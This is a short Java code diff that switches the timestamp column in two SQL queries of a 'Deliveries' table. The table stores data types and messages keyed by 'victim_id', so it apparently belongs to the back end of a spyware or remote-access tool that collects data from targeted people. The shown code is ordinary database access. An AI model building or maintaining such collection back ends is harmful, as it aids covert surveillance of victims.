@@ -78,7 +78,7 @@ public class Deliveries extends BaseTable<Delivery> {
     }
 
     public String getLastDeliveryTime(String theVictimId) {
-        final String query = "SELECT UNIX_TIMESTAMP(created_at) AS unix_epoch FROM deliveries WHERE victim_id = ? ORDER BY id DESC LIMIT 1";
+        final String query = "SELECT UNIX_TIMESTAMP(last_logged_at) AS unix_epoch FROM deliveries WHERE victim_id = ? ORDER BY id DESC LIMIT 1";
 
         String relativeTime = null;
         final java.sql.Connection con = Connection.getConnection();
@@ -114,7 +114,7 @@ public class Deliveries extends BaseTable<Delivery> {
     public List<Delivery> getAll(String victimId) {
 
         List<Delivery> deliveries = null;
-        final String query = "SELECT data_type,message, UNIX_TIMESTAMP(created_at) AS unix_epoch FROM deliveries WHERE victim_id= ? ORDER BY id DESC;";
+        final String query = "SELECT data_type,message, UNIX_TIMESTAMP(last_logged_at) AS unix_epoch FROM deliveries WHERE victim_id= ? ORDER BY id DESC;";
         final java.sql.Connection con = Connection.getConnection();
         try {
             final PreparedStatement ps = con.prepareStatement(query);
